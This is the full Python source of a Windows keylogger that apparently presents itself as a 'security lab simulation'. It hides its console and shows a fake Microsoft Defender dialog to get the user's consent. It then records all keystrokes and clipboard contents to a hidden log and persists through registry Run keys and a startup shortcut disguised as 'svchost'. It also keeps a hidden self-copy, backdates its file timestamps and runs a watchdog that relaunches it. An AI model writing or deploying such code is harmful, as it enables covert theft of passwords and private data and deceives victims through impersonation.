import ctypes
import time
import os
import shutil
import subprocess
import threading
from pynput import keyboard
import pyperclip
from datetime import datetime
import winreg
import sys

# For startup shortcut creation
try:
    from win32com.client import Dispatch
    import winshell
except ImportError:
    Dispatch = None
    winshell = None


# ------------------------
# 🔒 Hide console window
# ------------------------
whnd = ctypes.windll.kernel32.GetConsoleWindow()
if whnd != 0:
    ctypes.windll.user32.ShowWindow(whnd, 0)
    ctypes.windll.kernel32.CloseHandle(whnd)


# ------------------------
# 📁 Configuration
# ------------------------
log_file = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\SecurityLab\logs.txt")
clipboard_check_interval = 2  # seconds
last_clipboard_content = ""


# ------------------------
# 📢 Warning Message
# ------------------------
def show_security_warning():
    message = (
        "🔒 Microsoft Defender Proactive Security Scan 🔒\n\n"
        "Your system is being analyzed for behavioral threats.\n\n"
        "• Real-time keystroke anomaly detection: ACTIVE\n"
        "• Suspicious activity monitoring: ENABLED\n"
        "• Data exfiltration protection: RUNNING\n\n"
        "This automated scan helps prevent:\n"
        "✓ Credential theft\n"
        "✓ Keylogger attacks\n"
        "✓ Unauthorized data access\n\n"
        "[OK] to allow background protection\n"
    )
    return ctypes.windll.user32.MessageBoxW(0, message, "Alert", 0x40 | 0x1) == 1


# ------------------------
# 📄 Logging Function
# ------------------------
def write_to_file(text):
    try:
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(timestamp + text + "\n")
    except Exception:
        pass  # Avoid crashing if logging fails


# ------------------------
# 🔁 Persistence (Registry Run Key)
# ------------------------
def add_persistence(exe_path):
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_name = "SecurityLabSimulator"
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, reg_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(reg_key)
        write_to_file(f"✅ Registry persistence set to backup path: {exe_path}")
    except Exception as e:
        write_to_file(f"❌ Registry persistence failed: {str(e)}")


# ------------------------
# 💾 Hidden Backup Creation
# ------------------------
def create_hidden_backup():
    backup_path = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\SecurityLab\securitylab_backup.exe")
    current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.realpath(__file__)
    try:
        os.makedirs(os.path.dirname(backup_path), exist_ok=True)
        if not os.path.exists(backup_path):
            shutil.copyfile(current_path, backup_path)
            subprocess.call(['attrib', '+h', backup_path])
            write_to_file("✅ Hidden backup .exe created.")
        return backup_path
    except Exception as e:
        write_to_file(f"Backup creation error: {str(e)}")
        return None


# ------------------------
# 🧬 Watchdog for Redeployment
# ------------------------
def start_watchdog(backup_path):
    def monitor():
        time.sleep(10)
        while True:
            time.sleep(5)
            current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.realpath(__file__)
            if not os.path.exists(current_path):
                try:
                    subprocess.Popen([backup_path], creationflags=subprocess.CREATE_NO_WINDOW)
                    break
                except Exception as e:
                    write_to_file(f"Watchdog error: {e}")
                    break
    thread = threading.Thread(target=monitor, daemon=True)
    thread.start()


# ------------------------
# 📋 Clipboard Monitoring
# ------------------------
def monitor_clipboard():
    global last_clipboard_content
    while True:
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard and current_clipboard != last_clipboard_content:
                write_to_file(f"Clipboard content: {current_clipboard}")
                last_clipboard_content = current_clipboard
        except Exception as e:
            write_to_file(f"Clipboard error: {str(e)}")
        time.sleep(clipboard_check_interval)


# ------------------------
# ⌨️ Key Press Listener
# ------------------------
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char and key.char.isprintable():
            write_to_file(f"Typed: {key.char}")
    except AttributeError:
        special_keys = {
            keyboard.Key.space: "[SPACE]",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.esc: "[ESC]"
        }
        if key in special_keys:
            write_to_file(f"Pressed: {special_keys[key]}")
        elif hasattr(key, 'name'):
            write_to_file(f"Pressed: [{key.name.upper()}]")


# ------------------------
# 🔒 Enhanced File Hiding
# ------------------------
def enhance_file_hiding(file_path):
    try:
        subprocess.call(['attrib', '+h', '+s', '+r', file_path])
        # Optional: set file timestamp to Jan 1, 2020 for camouflage
        import time
        past_time = time.mktime((2020, 1, 1, 0, 0, 0, 0, 0, 0))
        os.utime(file_path, (past_time, past_time))
        write_to_file(f"✅ Enhanced hiding applied to: {file_path}")
    except Exception as e:
        write_to_file(f"Error enhancing file hiding: {e}")


# ------------------------
# 🗝️ Alternative Registry Persistence
# ------------------------
def add_alternative_registry_persistence(exe_path):
    reg_paths = [
        r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        r"Software\Microsoft\Windows\CurrentVersion\RunOnceEx"
    ]
    reg_name = "svchost"  # looks like legit Windows process
    for reg_path in reg_paths:
        try:
            reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.SetValueEx(reg_key, reg_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(reg_key)
            write_to_file(f"✅ Alternative registry persistence set at: {reg_path}\\{reg_name}")
            break
        except Exception as e:
            write_to_file(f"Failed setting alternative registry persistence at {reg_path}: {e}")


# ------------------------
# 📂 Create Startup Folder Shortcut
# ------------------------
def create_startup_shortcut(exe_path):
    if Dispatch is None or winshell is None:
        write_to_file("⚠️ pywin32 or winshell not installed, skipping startup shortcut creation.")
        return
    try:
        startup_path = winshell.startup()
        shortcut_path = os.path.join(startup_path, "svchost.lnk")  # misleading name
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = exe_path
        shortcut.WorkingDirectory = os.path.dirname(exe_path)
        shortcut.IconLocation = exe_path
        shortcut.save()
        write_to_file(f"✅ Startup shortcut created at: {shortcut_path}")
    except Exception as e:
        write_to_file(f"Failed creating startup shortcut: {e}")


# ------------------------
# 🧩 Function to add all extra persistence & hiding
# ------------------------
def add_extra_persistence_and_hiding(exe_path):
    enhance_file_hiding(exe_path)
    add_alternative_registry_persistence(exe_path)
    create_startup_shortcut(exe_path)


# ------------------------
# 🚀 Main Function
# ------------------------
def main():
    if show_security_warning():
        write_to_file("---- Keylogger Simulation Started ----")

        backup_path = create_hidden_backup()
        if backup_path:
            add_persistence(backup_path)               # Your original persistence
            add_extra_persistence_and_hiding(backup_path)  # New extra stealth persistence

            start_watchdog(backup_path)

        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()


if __name__ == "__main__":
    main()
